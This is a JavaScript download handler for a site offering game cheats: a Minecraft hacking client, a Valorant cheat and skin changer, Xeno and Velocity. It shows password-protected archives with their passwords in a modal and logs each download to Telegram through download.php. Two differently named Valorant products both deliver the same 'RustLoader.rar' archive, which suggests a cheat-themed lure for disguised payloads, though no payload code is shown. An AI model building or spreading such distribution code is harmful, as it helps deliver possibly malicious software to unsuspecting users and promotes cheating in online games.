// Download handler for local site functionality
(function() {
    'use strict';

    // Конфигурация для каждой страницы
    const downloadConfig = {
        'hawk-client': {
            title: 'Thanks for downloading Minecraft Hacking Client HAWK!',
            message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
            warning: {
                enabled: true,
                text: 'Can\'t extract the file? Try getting WinRaR for entering a password to extract.',
                rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
            },
            password: 'cato2026',
            downloadUrl: '../minecraftclient/HawkClient.zip'
        },
        'valo-cheat': {
            title: 'Thanks for downloading Hawk - Valorant Cheat!',
            message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
            warning: {
                enabled: true,
                text: 'Can\'t extract the file? Try getting WinRaR for entering a password to extract.',
                rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
            },
            password: 'cato2026',
            downloadUrl: 'files/RustLoader.rar'
        },
        'valo-changer': {
            title: 'Thanks for downloading Valorant Skin Changer!',
            message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
            warning: {
                enabled: true,
                text: 'Can\'t extract the file? Try getting WinRaR for entering a password to extract.',
                rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
            },
            password: 'cato2026',
            downloadUrl: 'files/RustLoader.rar'
        },
        'xeno': {
            title: 'Thanks for downloading Xeno!',
            message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
            warning: {
                enabled: true,
                text: 'Can\'t extract the file? Try getting WinRaR for entering a password to extract.',
                rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
            },
            password: 'cheatcity',
            downloadUrl: '../xeno/main/Xeno-v1.3.25b2.zip'
        },
        'velocity': {
            title: 'Thanks for downloading Velocity!',
            message: 'Your download should start automatically. If it doesn\'t, please reload the page and try again.',
            warning: {
                enabled: true,
                text: 'Can\'t extract the file? Try getting WinRaR for entering a password to extract.',
                rawDownloadUrl: 'https://www.win-rar.com/postdownload.html?&L=0',
                rawDownloadLabel: 'DIRECT WINRAR DOWNLOAD (RAW)'
            },
            password: 'velocity123',
            downloadUrl: '../velocity/Velocity.zip'
        }
    };

    // Функция для инициации скачивания файла
    function triggerDownload(url, cheatName) {
        // Используем трекер скачиваний для уведомлений в Telegram
        // Внешние ссылки (http/https) — через ?url= (редирект после лога)
        const isRemote = /^https?:\/\//i.test(url);
        const trackerUrl = isRemote
            ? 'download.php?url=' + encodeURIComponent(url) + '&cheat=' + encodeURIComponent(cheatName)
            : 'download.php?file=' + encodeURIComponent(url) + '&cheat=' + encodeURIComponent(cheatName);

        const a = document.createElement('a');
        a.href = trackerUrl;
        a.download = url.split('/').pop();
        a.target = '_blank';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }

    // Создание модального окна
    function createModal(config) {
        const modal = document.createElement('div');
        modal.className = 'download-modal-overlay';
        modal.innerHTML = `
            <div class="download-modal">
                <div class="modal-header">
                    <h2 class="modal-title">${config.title}</h2>
                    <button class="modal-close" onclick="closeDownloadModal()">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M18 6 6 18"></path>
                            <path d="m6 6 12 12"></path>
                        </svg>
                    </button>
                </div>
                <div class="modal-body">
                    <p class="modal-message">${config.message}</p>
                    ${config.warning.enabled ? `
                        <div class="modal-warning">
                            <div class="warning-header">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path>
                                    <path d="M12 9v4"></path>
                                    <path d="M12 17h.01"></path>
                                </svg>
                                <span>${config.warning.text}</span>
                            </div>
                            <a href="${config.warning.rawDownloadUrl}" class="warning-download-btn">
                                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M12 15V3"></path>
                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                                    <path d="m7 10 5 5 5-5"></path>
                                </svg>
                                ${config.warning.rawDownloadLabel}
                            </a>
                        </div>
                    ` : ''}
                    <div class="modal-password">
                        <div class="password-header">
                            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                            </svg>
                            <span>ARCHIVE PASSWORD</span>
                        </div>
                        <div class="password-input-wrapper">
                            <code class="password-value">${config.password}</code>
                            <button class="password-copy-btn" onclick="copyPassword('${config.password}')">
                                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                                </svg>
                                <span>Copy</span>
                            </button>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="modal-close-btn" onclick="closeDownloadModal()">CLOSE</button>
                </div>
            </div>
        `;
        return modal;
    }

    // Показать модальное окно
    window.showDownloadModal = function(config) {
        const existingModal = document.querySelector('.download-modal-overlay');
        if (existingModal) {
            existingModal.remove();
        }

        const modal = createModal(config);
        document.body.appendChild(modal);

        // Запускаем скачивание
        triggerDownload(config.downloadUrl, config.title);
    };

    // Закрыть модальное окно
    window.closeDownloadModal = function() {
        const modal = document.querySelector('.download-modal-overlay');
        if (modal) {
            modal.remove();
        }
    };

    // Копировать пароль
    window.copyPassword = function(password) {
        navigator.clipboard.writeText(password).then(() => {
            const btn = document.querySelector('.password-copy-btn span');
            if (btn) {
                btn.textContent = 'Copied!';
                setTimeout(() => {
                    btn.textContent = 'Copy';
                }, 2000);
            }
        });
    };

    // Находим все кнопки download и добавляем обработчики
    function initDownloadButtons() {
        const buttons = document.querySelectorAll('.download-btn');
        buttons.forEach((button) => {
            if (button.dataset.handlerAdded) return;
            button.dataset.handlerAdded = 'true';

            // Определяем конфигурацию на основе пути страницы
            const pagePath = window.location.pathname;
            let config = null;

            for (const [key, value] of Object.entries(downloadConfig)) {
                if (pagePath.includes(key)) {
                    config = value;
                    break;
                }
            }

            if (config) {
                button.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    window.showDownloadModal(config);
                    return false;
                });
            }
        });
    }

    // Добавляем стили
    function addStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .download-modal-overlay {
                position: fixed;
                inset: 0;
                z-index: 1000;
                display: flex;
                align-items: center;
                justify-content: center;
                background: rgba(3, 3, 8, 0.88);
                backdrop-filter: blur(16px) saturate(1.2);
                -webkit-backdrop-filter: blur(16px) saturate(1.2);
                animation: fadeIn 0.25s ease-out;
            }

            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }

            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: scale(0.95) translateY(-10px);
                }
                to {
                    opacity: 1;
                    transform: scale(1) translateY(0);
                }
            }

            .download-modal {
                position: relative;
                z-index: 1001;
                width: 100%;
                max-width: 480px;
                margin: 16px;
                background: rgba(12, 12, 24, 0.95);
                border: 1px solid rgba(139, 92, 246, 0.25);
                border-radius: 16px;
                box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6), 0 0 60px rgba(139, 92, 246, 0.15);
                animation: slideIn 0.35s cubic-bezier(0.22, 1, 0.36, 1);
                font-family: 'JetBrains Mono', 'Consolas', monospace;
            }

            .modal-header {
                display: flex;
                align-items: flex-start;
                justify-content: space-between;
                padding: 20px 24px;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            }

            .modal-title {
                font-family: 'Syne', system-ui, sans-serif;
                font-size: 15px;
                font-weight: 700;
                color: #f4f4f8;
                margin: 0;
                line-height: 1.5;
            }

            .modal-close {
                background: none;
                border: none;
                color: rgba(255, 255, 255, 0.4);
                cursor: pointer;
                padding: 4px;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: color 0.2s;
            }

            .modal-close:hover {
                color: #fff;
            }

            .modal-body {
                padding: 20px 24px;
            }

            .modal-message {
                font-size: 14px;
                line-height: 1.6;
                color: rgba(255, 255, 255, 0.5);
                margin: 0 0 16px 0;
            }

            .modal-warning {
                border: 1px solid rgba(234, 179, 8, 0.2);
                background: rgba(234, 179, 8, 0.05);
                padding: 16px;
                margin-bottom: 16px;
            }

            .warning-header {
                display: flex;
                align-items: flex-start;
                gap: 10px;
                margin-bottom: 12px;
            }

            .warning-header svg {
                color: #eab308;
                flex-shrink: 0;
            }

            .warning-header span {
                font-family: 'Courier New', monospace;
                font-size: 12px;
                line-height: 1.5;
                color: rgba(234, 179, 8, 0.8);
            }

            .warning-download-btn {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                border: 1px solid rgba(234, 179, 8, 0.3);
                background: rgba(234, 179, 8, 0.1);
                padding: 8px 16px;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                color: #eab308;
                text-decoration: none;
                transition: all 0.2s;
            }

            .warning-download-btn:hover {
                background: rgba(234, 179, 8, 0.2);
            }

            .modal-password {
                border: 1px solid rgba(255, 255, 255, 0.1);
                background: rgba(255, 255, 255, 0.03);
                padding: 12px 16px;
            }

            .password-header {
                display: flex;
                align-items: center;
                gap: 8px;
                margin-bottom: 10px;
            }

            .password-header svg {
                color: rgba(255, 255, 255, 0.4);
            }

            .password-header span {
                font-family: 'Courier New', monospace;
                font-size: 10px;
                text-transform: uppercase;
                letter-spacing: 1px;
                color: rgba(255, 255, 255, 0.4);
            }

            .password-input-wrapper {
                display: flex;
                align-items: center;
                gap: 8px;
            }

            .password-value {
                flex: 1;
                background: #000;
                border: 1px solid rgba(255, 255, 255, 0.1);
                padding: 8px 12px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                color: #fff;
            }

            .password-copy-btn {
                display: flex;
                align-items: center;
                gap: 6px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                background: rgba(255, 255, 255, 0.05);
                padding: 8px 12px;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                color: rgba(255, 255, 255, 0.6);
                cursor: pointer;
                transition: all 0.2s;
            }

            .password-copy-btn:hover {
                background: rgba(255, 255, 255, 0.1);
                color: #fff;
            }

            .modal-footer {
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding: 12px 24px;
            }

            .modal-close-btn {
                width: 100%;
                border: none;
                border-radius: 10px;
                background: linear-gradient(135deg, #8b5cf6, #06b6d4);
                font-family: 'JetBrains Mono', monospace;
                font-size: 12px;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 0.08em;
                color: #fff;
                padding: 12px;
                cursor: pointer;
                transition: transform 0.25s, box-shadow 0.25s;
                box-shadow: 0 6px 24px rgba(139, 92, 246, 0.35);
            }

            .modal-close-btn:hover {
                transform: translateY(-1px);
                box-shadow: 0 8px 28px rgba(139, 92, 246, 0.45);
            }
        `;
        document.head.appendChild(style);
    }

    // Инициализация
    addStyles();

    // Запускаем после загрузки DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initDownloadButtons);
    } else {
        initDownloadButtons();
    }
})();
